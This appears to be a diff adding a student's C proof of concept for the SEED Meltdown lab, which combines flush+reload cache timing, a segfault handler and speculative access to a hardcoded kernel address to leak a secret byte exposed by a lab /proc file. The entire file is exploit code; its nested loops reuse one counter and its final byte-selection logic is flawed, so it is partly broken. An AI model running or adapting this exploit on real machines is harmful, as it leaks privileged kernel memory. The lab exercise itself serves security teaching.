@@ -1,0 +1,112 @@
+/*
+	Read kernel byte from user-space using Meltdown!	
+	
+	Syracuse University's Meltdown Lab
+	http://www.cis.syr.edu/~wedu/seed/Labs_16.04/System/Meltdown_Attack/Meltdown_Attack.pdf
+*/
+
+#include <stdio.h>
+#include <setjmp.h> //sigjump_buf
+#include <signal.h> // signal handler
+#include <stdint.h>
+#include <emmintrin.h> // _mm_clfush()
+#include <x86intrin.h>
+#include <fcntl.h> // for open() the /proc file
+#include <unistd.h> // pread() /proc file
+
+#define PAGE_SIZE 4096
+#define PROBE_N 256
+#define CACHE_HIT_THRESHOLD 100
+#define DELTA 1024 // to reduce bias toward 0
+#define ITER_N 1000
+
+// using the same technique from cache-time.c/flush-reload.c
+uint8_t probe_array[PROBE_N * PAGE_SIZE];
+int scores[PROBE_N] = {0};
+
+static sigjmp_buf jbuf;
+
+// signal handler on a segmentation fault
+static void catch_segv() {
+
+	// siglongjmp(sigjump_buf, return value)
+	siglongjmp(jbuf, 1); // return to the checkpoint set when sigsetjump() was called ; restores context
+	// return val is 1 so that the if statement goes to the else clause when returning
+}
+
+void probe() {
+	// time accesses to each element in the probe_array	
+	unsigned int junk = 0; // ???
+	register uint64_t start, total_cycles;
+	volatile uint8_t* addr; // 8-bit pointer = byte pointer
+
+	int i;
+	for(i=0; i<PROBE_N; i++) {
+		addr = &probe_array[i * PAGE_SIZE]; 
+		start = __rdtscp(&junk); // read time stamp before the memory read
+		junk = *addr; // read value
+		total_cycles = __rdtscp(&junk) - start;	
+		if(total_cycles < CACHE_HIT_THRESHOLD) scores[i]++; 
+	}
+}
+
+int main(int argc, char* argv[]) {
+
+	unsigned long kernel_addr = 0x0000000088ed8932; // address of secret value in kernel space
+
+	// register signal handler for seg fault
+	signal(SIGSEGV, catch_segv);
+
+	/* Same technique as cache-time.c/flush-reload.c */
+
+	// initialize the probe_array
+	int i;
+	for(i=0; i<PROBE_N; i++) { // only going down a single column in probe array ; these are the only elements we access
+		probe_array[i * PAGE_SIZE] = 1;	
+	}
+	// bring kernel data into the cache
+	// open kernel /proc file
+	int fd = open("/proc/secret_data", O_RDONLY);
+	if(fd < 0) {
+		perror("Failed to open /proc file.\n");
+		return -1;
+	}
+
+	for(i=0; i<ITER_N; i++) {
+		// flush probe_array from CPU cache
+		for(i=0; i<PROBE_N; i++) {
+			// invalidates and flushes the cache line that contains the address from all caches in the cache hierarchy
+			_mm_clflush(&probe_array[i * PAGE_SIZE]);
+		}		
+		int ret = pread(fd, NULL, 0, 0); // triggers the proc_read() function in kernel to be executed
+
+		// creates a checkpoint ; context is saved in sigjump_buf jbuf
+		if(sigsetjmp(jbuf, 1) == 0) {  // return 0 if checkpoint was set up ; returns non-zero if returning from siglongjump()
+			// cause seg fault
+			char kernel_byte;
+			asm volatile( // keep %eax busy? give CPU something to do while memory request is speculatively being serviced
+				".rept 400;"
+				"add $0x141, %%eax;"
+				".endr;"
+				
+				:
+				:
+				: "eax"
+			);
+
+			kernel_byte = *(char*)kernel_addr;
+			probe_array[kernel_byte * PAGE_SIZE] = 100; // access using kernel byte doesn't work... (but any other int does)
+			printf("Look at me!!! I got the secret! %c\n", kernel_byte); // should never execute
+		}
+		probe(); 
+	} // iter ; end
+
+	int max = 0;
+	for(i=0; i<PROBE_N; i++) {
+		if(scores[i] > max) max = i;
+	}
+	printf("Guess: %c (%i)\n", max, max);
+	printf("%i hits\n", scores[max]);
+
+	return 0;
+}
